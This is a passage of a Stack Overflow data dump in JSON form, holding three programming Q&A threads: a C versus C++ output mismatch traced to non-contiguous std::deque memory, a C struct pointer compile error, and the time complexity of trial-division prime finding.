Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1498074512, "post_id": 44684970, "comment_id": 76354238, "body": "@4386427 exactly, and that&#39;s probably the key of the difference."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498074589, "post_id": 44684970, "comment_id": 76354273, "body": "As in <i>there&#39;s literally no code that outputs anything</i>? Well, yeah. Must be missing :)"}, {"owner": {"reputation": 171, "user_id": 2336748, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uuTKW.gif?s=128&g=1", "display_name": "MadHatter", "link": "https://stackoverflow.com/users/2336748/madhatter"}, "edited": false, "score": 0, "creation_date": 1498074806, "post_id": 44684970, "comment_id": 76354400, "body": "I have the code in an &#39;extern c&#39;. So I still use c++ std::cout to print. So its the same code that I use to print in c++"}, {"owner": {"reputation": 171, "user_id": 2336748, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uuTKW.gif?s=128&g=1", "display_name": "MadHatter", "link": "https://stackoverflow.com/users/2336748/madhatter"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498074810, "post_id": 44684970, "comment_id": 76354407, "body": "@Jean-Fran&#231;oisFabre for (unsigned int i = 0; i &lt; bMatSize; ++i) { \t\t\t\t\tstd::cout &lt;&lt; bMat[i] &lt;&lt; &#39; &#39;; \t\t\t\t} \t\t\t\tstd::cout &lt;&lt; std::endl;"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498074823, "post_id": 44684970, "comment_id": 76354413, "body": "@Jean-Fran&#231;oisFabre not <i>just useless</i>, I think it is <i>a bit</i> harmful in that it makes casting of pointer types look like a normal thing to do. But indeed, nothing to &quot;shout&quot; about ;)"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498074943, "post_id": 44684970, "comment_id": 76354477, "body": "where is <code>queueTest</code> defined/allocated in the C version? also does  <code>simgms_math_ddot</code> has a valid prototype in the C version?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1498075032, "post_id": 44684970, "comment_id": 76354522, "body": "note that it&#39;s not just rounded. Some values don&#39;t match their rounded counterparts (ex: 1.11 vs 0)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1498075231, "post_id": 44684970, "comment_id": 76354634, "body": "@Jean-Fran&#231;oisFabre: Such caasts can shadow errors, e.g. typos or missing headers. It is very well considered harmful. It also is a good indicator if the code is <b>really</b> compiled with a C compiler or not. There are way too many people thinking compiling C coding style with a C++ compiler is identical to C code.  Oh, and shouting is more LIKE THIS!"}, {"owner": {"reputation": 171, "user_id": 2336748, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uuTKW.gif?s=128&g=1", "display_name": "MadHatter", "link": "https://stackoverflow.com/users/2336748/madhatter"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498075239, "post_id": 44684970, "comment_id": 76354638, "body": "@Jean-Fran&#231;oisFabre std::deque&lt; double* &gt; queueTest; ....Its filled with errorMatrix elements, which are 2d arrays, e.g:  queueTest.push_front(errorMatrix);"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 85518, "user_id": 1593077, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/10c44e0d9568e48d05708ae196ad936f?s=128&d=identicon&r=PG", "display_name": "einpoklum", "link": "https://stackoverflow.com/users/1593077/einpoklum"}, "edited": false, "score": 0, "creation_date": 1498075322, "post_id": 44684970, "comment_id": 76354690, "body": "@einpoklum: The Exclamation mark just adds some emphasis to the sentence. Shouting would be ALL UPPERCASE."}, {"owner": {"reputation": 171, "user_id": 2336748, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uuTKW.gif?s=128&g=1", "display_name": "MadHatter", "link": "https://stackoverflow.com/users/2336748/madhatter"}, "edited": false, "score": 0, "creation_date": 1498075352, "post_id": 44684970, "comment_id": 76354701, "body": "And the error matrix contains values,                                                                         ,1.78e-15 0.387 1.3 -0.48 -17.5 2.28 -0.387 -1.78e-15 1.48 -0.33 -17.3 2.4 -1.3 -1.48 -1.11e-16 1.08 -0.926 2.41 0.48 0.33 -1.08 0 0.551 0.74 17.5 17.3 0.926 -0.551 0 -0.384 -2.28 -2.4 -2.41 -0.74 0.384 0"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1498075507, "post_id": 44684970, "comment_id": 76354780, "body": "@MadHatter - Don&#39;t put information in comments - update the question using the <code>edit</code> link just below the question"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1498075654, "post_id": 44684970, "comment_id": 76354848, "body": "@4386427 put &quot;edit&quot; between square brackets to provide the <a href=\"https://stackoverflow.com/posts/44684970/edit\">edit</a> link."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1498075698, "post_id": 44684970, "comment_id": 76354877, "body": "@MadHatter correct me if I&#39;m wrong, but a double ended queue isn&#39;t contiguous in memory. So in C it will fail."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1498075956, "post_id": 44684970, "comment_id": 76355042, "body": "@4386427: like this <code>[edit]</code>"}], "answers": [{"comments": [{"owner": {"reputation": 171, "user_id": 2336748, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uuTKW.gif?s=128&g=1", "display_name": "MadHatter", "link": "https://stackoverflow.com/users/2336748/madhatter"}, "edited": false, "score": 0, "creation_date": 1498076178, "post_id": 44685459, "comment_id": 76355153, "body": "I&#39;ll try this and get back to you, thanks!"}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 1, "last_activity_date": 1498076254, "last_edit_date": 1498076254, "creation_date": 1498075925, "answer_id": 44685459, "question_id": 44684970, "link": "https://stackoverflow.com/questions/44684970/i-converted-a-c-vector-data-set-into-a-c-array-i-pass-the-same-data-set-into/44685459#44685459", "title": "I converted a c++ vector data-set into a c array. I pass the same data-set into a function that should give the same output", "body": "<p>The problem is probably because of the way you're storing <code>queueTest</code> in a <code>deque</code>.</p>\n\n<pre><code>queueTest.at(ii).data()\n</code></pre>\n\n<p>reaches the iith element without problem (but with <code>O(n)</code> complexity, and can make you think that it's indexed access whereas it's not), but if you pass the address of the first element of the <code>std::deque</code> to your C program, adding an offset won't work because, unlike <code>std::vector</code> memory, <code>std::deque</code> memory isn't contiguous (it's a linked list) so you're getting random data for your coefficients.</p>\n\n<p>From <a href=\"http://www.cplusplus.com/reference/deque/deque/\" rel=\"nofollow noreferrer\">http://www.cplusplus.com/reference/deque/deque/</a>:</p>\n\n<blockquote>\n  <p>unlike vectors, deques are not guaranteed to store all its elements in contiguous storage locations: accessing elements in a deque by offsetting a pointer to another element causes <strong>undefined behavior</strong>.</p>\n</blockquote>\n\n<p>The quickfix to be able to use it from the C side is to convert your <code>deque</code> to a <code>vector</code>.</p>\n"}], "owner": {"reputation": 171, "user_id": 2336748, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uuTKW.gif?s=128&g=1", "display_name": "MadHatter", "link": "https://stackoverflow.com/users/2336748/madhatter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "closed_date": 1498089971, "answer_count": 1, "score": 2, "last_activity_date": 1498076254, "creation_date": 1498074111, "last_edit_date": 1498075705, "question_id": 44684970, "link": "https://stackoverflow.com/questions/44684970/i-converted-a-c-vector-data-set-into-a-c-array-i-pass-the-same-data-set-into", "closed_reason": "Not suitable for this site", "title": "I converted a c++ vector data-set into a c array. I pass the same data-set into a function that should give the same output", "body": "<p>This code should generate the same output. But the c output seems to be rounded up while c++ is not. I don't understand what is going on here. \nPlease explain.</p>\n\n<p>Upto the point where I show the code, same values are passed to both c and c++ code.</p>\n\n<p>c code:</p>\n\n<pre><code>unsigned int sz1=sz+1; \ndouble* bMat = (double*)calloc(bMatSize,bMatSize * sizeof(double));\n\nfor (unsigned int ii = 0; ii&lt;sz; ii++)\n    for (unsigned int jj = 0; jj &lt;= ii; jj++)\n    {\n       bMat[jj*sz1 + ii] = simgms_math_ddot(numBFunc, queueTest[ii], queueTest[jj] );\n       bMat[ii*sz1 + jj] = bMat[jj*sz1 + ii];\n    }\n</code></pre>\n\n<p>c++ code:</p>\n\n<pre><code>std::vector&lt;double&gt; bMat;\nunsigned int sz1=sz+1;\nbMat.resize(sz1*sz1);\nfor(unsigned int ii=0; ii&lt;sz; ii++)\n    for(unsigned int jj=0; jj&lt;=ii; jj++)\n    {\n        bMat.at(jj*sz1+ii)=simgms_math_ddot(numBFunc, queueTest.at(ii).data(), queueTest.at(jj).data());\n        bMat.at(ii*sz1+jj)=bMat.at(jj*sz1+ii);\n    }\n\nfor (int i = 0; i &lt; bMat.size(); ++i) {\n   std::cout &lt;&lt; bMat[i] &lt;&lt; ' ';\n}\nstd::cout &lt;&lt; std::endl;\n</code></pre>\n\n<p>common function</p>\n\n<pre><code>double simgms_math_ddot(unsigned int numElements, double aMat[], double bMat[])\n\n{\n    const MKL_INT n=numElements;\n\n    double res = cblas_ddot(n, aMat, 1, bMat, 1);\n\n    return res;\n}\n</code></pre>\n\n<p>c coutput (bMat)</p>\n\n<pre><code>0 0 -1 0 0 -1 -1 -1 0  \n</code></pre>\n\n<p>c++ coutput (bMat)</p>\n\n<pre><code> 1.05e-05 0.00134 -1 0.00134 1.11 -1 -1 -1 0 \n</code></pre>\n\n<p>And the error matrix contains values:</p>\n\n<pre><code>1.78e-15 0.387 1.3 -0.48 -17.5 2.28 -0.387 -1.78e-15 1.48 -0.33 -17.3 2.4 -1.3 -1.48 -1.11e-16 1.08 -0.926 2.41 0.48 0.33 -1.08 0 0.551 0.74 17.5 17.3 0.926 -0.551 0 -0.384 -2.28 -2.4 -2.41 -0.74 0.384 0\n\nstd::deque&lt; double* &gt; queueTest;\n</code></pre>\n\n<p>....Its filled with errorMatrix elements, which are 2d arrays,</p>\n\n<pre><code> e.g: queueTest.push_front(errorMatrix);\n</code></pre>\n"}, {"tags": ["c", "struct", "compiler-errors"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498074175, "post_id": 44684944, "comment_id": 76354061, "body": "<code>Ladro</code> is not a pointer."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1498074213, "post_id": 44684944, "comment_id": 76354075, "body": "If you replace <code>-&gt;</code> by <code>.</code>, which errort do yo get."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1498074265, "post_id": 44684944, "comment_id": 76354106, "body": "This is what is happening when you mix local and global variables with the same names and different types."}, {"owner": {"reputation": 31, "user_id": 8196194, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KTvVy.png?s=128&g=1", "display_name": "Jacopo", "link": "https://stackoverflow.com/users/8196194/jacopo"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1498074550, "post_id": 44684944, "comment_id": 76354254, "body": "@MichaelWalz if i do this, i get this error: error: request for member &#39;nx&#39; in something not a structure or union|"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1498074644, "post_id": 44684944, "comment_id": 76354307, "body": "<i>...sigh...</i>..So I am guessing you have replaced it for <code>Guardia</code> as well..."}, {"owner": {"reputation": 31, "user_id": 8196194, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KTvVy.png?s=128&g=1", "display_name": "Jacopo", "link": "https://stackoverflow.com/users/8196194/jacopo"}, "edited": false, "score": 0, "creation_date": 1498074757, "post_id": 44684944, "comment_id": 76354371, "body": "I solved, i forgetted to pass  with a pointer Ladro at the function, thanks for the reply ;)"}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 1, "creation_date": 1498078401, "post_id": 44684944, "comment_id": 76356225, "body": "You did not change the name <code>Guardia</code> in the function parameter list?   This hides the global variable...  You have more bugs waiting to happen."}], "answers": [{"tags": [], "owner": {"reputation": 213, "user_id": 7382775, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e12c9f2ab038e682444f9945a2e2685e?s=128&d=identicon&r=PG&f=1", "display_name": "rigby", "link": "https://stackoverflow.com/users/7382775/rigby"}, "is_accepted": true, "score": 0, "last_activity_date": 1498593083, "creation_date": 1498593083, "answer_id": 44788740, "question_id": 44684944, "link": "https://stackoverflow.com/questions/44684944/error-invalid-type-argument-of-have-personaggio/44788740#44788740", "title": "error: invalid type argument of &#39;-&gt;&#39; (have &#39;Personaggio&#39;)", "body": "<p>The variables inside the function do not know of the variables outside the function. The apparent issue seems to be that you initialized <code>Personaggio Ladro</code> outside the function. Your function has no idea of the existence of <code>Ladro</code> because you do not initialize such an object <strong>inside</strong> the function.</p>\n"}], "owner": {"reputation": 31, "user_id": 8196194, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KTvVy.png?s=128&g=1", "display_name": "Jacopo", "link": "https://stackoverflow.com/users/8196194/jacopo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 387, "favorite_count": 0, "accepted_answer_id": 44788740, "answer_count": 1, "score": 0, "last_activity_date": 1498593083, "creation_date": 1498074021, "question_id": 44684944, "link": "https://stackoverflow.com/questions/44684944/error-invalid-type-argument-of-have-personaggio", "title": "error: invalid type argument of &#39;-&gt;&#39; (have &#39;Personaggio&#39;)", "body": "<p>I have this problem while creating a function for moving a bot on a 16x16 Matrix, i want to subtract the coordinate x of Guardia with the coordinate Y of ladro. </p>\n\n<p>Belowe is the code:</p>\n\n<p>`</p>\n\n<pre><code>    typedef struct{\n    int  nx;\n    int  ny;\n    }Personaggio;\nPersonaggio Ladro;\nPersonaggio Guardia;\n\nvoid moveguardia(char scacchiera [][16], Personaggio *Guardia)\n\n    {\n          int movimento, GxMed, GyMed;\n          if(scacchiera[Guardia-&gt;nx-1][Guardia-&gt;ny]=='m'){\n            movimento=rand()%4;\n            if(movimento==0){\n              Guardia-&gt;nx=Guardia-&gt;nx+1;\n              scacchiera[Guardia-&gt;nx-1][Guardia-&gt;ny]=' ';\n              scacchiera[Guardia-&gt;nx][Guardia-&gt;ny]='G';\n            }\n        else if(movimento==1){\n               Guardia-&gt;nx=Guardia-&gt;nx-1;\n               scacchiera[Guardia-&gt;nx+1][Guardia-&gt;ny]=' ';\n               scacchiera[Guardia-&gt;nx][Guardia-&gt;ny]='G';\n        }\n        else   if(movimento==2){\n               Guardia-&gt;ny=Guardia-&gt;ny-1;\n               scacchiera[Guardia-&gt;nx][Guardia-&gt;ny+1]=' ';\n               scacchiera[Guardia-&gt;nx][Guardia-&gt;ny]='G';\n        }\n        else   if(movimento==3){\n               Guardia-&gt;ny=Guardia-&gt;ny+1;\n               scacchiera[Guardia-&gt;nx][Guardia-&gt;ny-1]=' ';\n               scacchiera[Guardia-&gt;nx][Guardia-&gt;ny]='G';\n        }\n            }\n        GxMed=abs((Guardia-&gt;nx) - (Ladro-&gt;nx));//error\n</code></pre>\n\n<p>the error is on this line GxMed=abs((Guardia->nx) - (Ladro->nx));//error</p>\n\n<p>Please have a look at lines commented as error. I have searched a lot and also tried replacing -> by . but useless.`</p>\n"}, {"tags": ["c", "time-complexity", "big-o", "primes"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498074015, "post_id": 44684730, "comment_id": 76353978, "body": "Aside: you don&#39;t need to check <i>all</i> the previous primes as factors - only those &lt;= square root of candidate. Such as the limit <code>a[k] * a[k] &lt;= j;</code> Moreover there is no need to check any even number."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498074367, "post_id": 44684730, "comment_id": 76354156, "body": "... with the exception of <code>2</code> which is the only even prime. So having initialised the array with <code>2</code> the outer loop can be <code>for (j = 3; i != n; j+=2)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 8106446, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pm6njSozvT0/AAAAAAAAAAI/AAAAAAAAADM/BBKqcy-96iM/photo.jpg?sz=128", "display_name": "Sai Shankar", "link": "https://stackoverflow.com/users/8106446/sai-shankar"}, "edited": false, "score": 0, "creation_date": 1498096286, "post_id": 44684939, "comment_id": 76361496, "body": "I mean that my inner loop runs for a maximum of i times."}], "tags": [], "owner": {"reputation": 826, "user_id": 1715099, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/623042c376d81e406a14cfd5607b127c?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/1715099/alex"}, "is_accepted": false, "score": 1, "last_activity_date": 1498073997, "creation_date": 1498073997, "answer_id": 44684939, "question_id": 44684730, "link": "https://stackoverflow.com/questions/44684730/time-complexity-finding-n-primes-with-trial-division-by-all-preceding-primes/44684939#44684939", "title": "Time complexity finding n primes with trial division by all preceding primes", "body": "<p>The prime number theorem states that asymptotically, the number of primes less than <code>n</code> is equal to <code>n/log n</code>.  Therefore, your inner loop will run Theta of <code>i * max</code> =<code>n / log n * n</code> times (assuming <code>max</code>=<code>n</code>).</p>\n\n<p>Also, your outer loop runs on the order of <code>n log n</code> times, making the total complexity Theta of <code>n / log n * n * n log n = n^3</code>.  In other words, this is not the most efficient algorithm.</p>\n\n<p>Note that there are better approximations around (e.g. the <code>n</code>-th prime number is closer to:</p>\n\n<p>n log n + n log log n - n + n log log n / log n + ...</p>\n\n<p>But, since you are concerned with just big O, this approximation is good enough.</p>\n\n<p>Also, there are much better algorithms for doing what you're looking to do.  Look up the topic of pseudoprimes, for more information.</p>\n"}, {"comments": [{"owner": {"reputation": 41, "user_id": 8106446, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pm6njSozvT0/AAAAAAAAAAI/AAAAAAAAADM/BBKqcy-96iM/photo.jpg?sz=128", "display_name": "Sai Shankar", "link": "https://stackoverflow.com/users/8106446/sai-shankar"}, "edited": false, "score": 0, "creation_date": 1498419221, "post_id": 44730062, "comment_id": 76480667, "body": "Thank you. Can we simplify this code of finding n primes?"}, {"owner": {"reputation": 61384, "user_id": 849891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/MbEO3.png?s=128&g=1", "display_name": "Will Ness", "link": "https://stackoverflow.com/users/849891/will-ness"}, "reply_to_user": {"reputation": 41, "user_id": 8106446, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pm6njSozvT0/AAAAAAAAAAI/AAAAAAAAADM/BBKqcy-96iM/photo.jpg?sz=128", "display_name": "Sai Shankar", "link": "https://stackoverflow.com/users/8106446/sai-shankar"}, "edited": false, "score": 0, "creation_date": 1498428432, "post_id": 44730062, "comment_id": 76483004, "body": "in what language? C? -- simplify, or optimize to improve its speed? the latter will need <i>more complex</i> code (to add one or two new tests). or the algorithm may be completely changed, specifically from your trial division, to the <a href=\"https://stackoverflow.com/questions/tagged/sieve-of-eratosthenes\">sieve-of-eratosthenes</a>. there&#39;s lots and lots of Q&amp;A on that in <a href=\"https://stackoverflow.com/questions/tagged/primes\">primes</a> on SO."}], "tags": [], "owner": {"reputation": 61384, "user_id": 849891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/MbEO3.png?s=128&g=1", "display_name": "Will Ness", "link": "https://stackoverflow.com/users/849891/will-ness"}, "is_accepted": true, "score": 1, "last_activity_date": 1498428607, "last_edit_date": 1498428607, "creation_date": 1498252603, "answer_id": 44730062, "question_id": 44684730, "link": "https://stackoverflow.com/questions/44684730/time-complexity-finding-n-primes-with-trial-division-by-all-preceding-primes/44730062#44730062", "title": "Time complexity finding n primes with trial division by all preceding primes", "body": "<p>In pseudocode your code is</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>firstnprimes(n) = a[:n]   # array a's first n entries\n    where\n       i = 0\n       a = [j for j in [2..]  \n                if is_empty( [j for p in a[:i] if (j%p == 0)] )\n                   &amp;&amp; (++i) ]\n</code></pre>\n\n<p>(assuming the short-circuiting <code>is_empty</code> which returns <code>false</code> as soon as the list is discovered to be non-empty).</p>\n\n<p>What it does is testing each candidate number from <em>2</em> and up by all its preceding primes.</p>\n\n<p>Melissa O'Neill analyzes this algorithm <a href=\"https://www.cs.hmc.edu/~oneill/papers/Sieve-JFP.pdf\" rel=\"nofollow noreferrer\">in her widely known</a> <a href=\"https://www.cambridge.org/core/journals/journal-of-functional-programming\" rel=\"nofollow noreferrer\">JFP</a> <a href=\"https://www.cs.hmc.edu/~oneill/papers/Sieve-JFP.pdf\" rel=\"nofollow noreferrer\">article</a> and derives its complexity as <em>O( n^2 )</em>. </p>\n\n<p>Basically, each of the <em>n</em> primes that are produced is paired up with (is tested by) all the primes preceding it (i.e. <em>k-1</em> primes, for the <em>k</em>&thinsp;th prime) and the sum of the arithmetic progression <em>0...(n-1)</em> is <em>(n-1)n/2</em> which is <em>O( n^2 )</em>; and she shows that composites do not contribute any term which is more significant than that to the overall sum, as there are <a href=\"https://en.wikipedia.org/wiki/Prime_number_theorem#Approximations_for_the_nth_prime_number\" rel=\"nofollow noreferrer\"><em>O(n log n)</em> composites</a> on the way to <em>n</em>&thinsp;th prime but the <code>is_empty</code> calculation <em>fails early</em> for them.</p>\n\n<hr>\n\n<p>Here's how it goes: with <em>m = n log n</em>, there will be <em>m/2</em> evens, for each of which the <code>is_empty</code> calculation takes just <em>1</em> step; <em>m/3</em> multiples of <em>3</em> with <em>2</em> steps; <em>m/5</em> with <em>3</em> steps; etc. </p>\n\n<p>So the total contribution of the composites, <strong>overestimated</strong> by not dealing with the multiplicities (basically, counting <em>15</em> twice, as a multiple of both <em>3</em> and <em>5</em>, etc.), is:</p>\n\n<pre><code>SUM{i = 1, ..., n} (i m / p_i)          // p_i is the i-th prime\n= m SUM{i = 1, ..., n} (i / p_i)\n= n log(n) SUM{i = 1, ..., n} (i / p_i)\n&lt; n log(n) (n / log(n))                 // for n &gt; 14,000 \n= n^2\n</code></pre>\n\n<p>The inequality can be tested at <a href=\"https://sandbox.open.wolframcloud.com/app/objects/0f34069d-2e85-4783-a315-fcf81bdd67be#sidebar=compute\" rel=\"nofollow noreferrer\">Wolfram Alpha cloud sandbox</a> as <code>Sum[ i/Prime[i], {i, 14000}] Log[14000.0] / 14000.0</code> (which is <em>0.99921</em>, and diminishing for bigger <em>n</em>, tested up to <em>n = 2,000,000</em> where it's <em>0.963554</em>).</p>\n"}], "owner": {"reputation": 41, "user_id": 8106446, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pm6njSozvT0/AAAAAAAAAAI/AAAAAAAAADM/BBKqcy-96iM/photo.jpg?sz=128", "display_name": "Sai Shankar", "link": "https://stackoverflow.com/users/8106446/sai-shankar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 504, "favorite_count": 0, "accepted_answer_id": 44730062, "answer_count": 2, "score": 1, "last_activity_date": 1498428607, "creation_date": 1498073325, "last_edit_date": 1498300245, "question_id": 44684730, "link": "https://stackoverflow.com/questions/44684730/time-complexity-finding-n-primes-with-trial-division-by-all-preceding-primes", "title": "Time complexity finding n primes with trial division by all preceding primes", "body": "<p>Problem :  Finding <em>n</em> prime 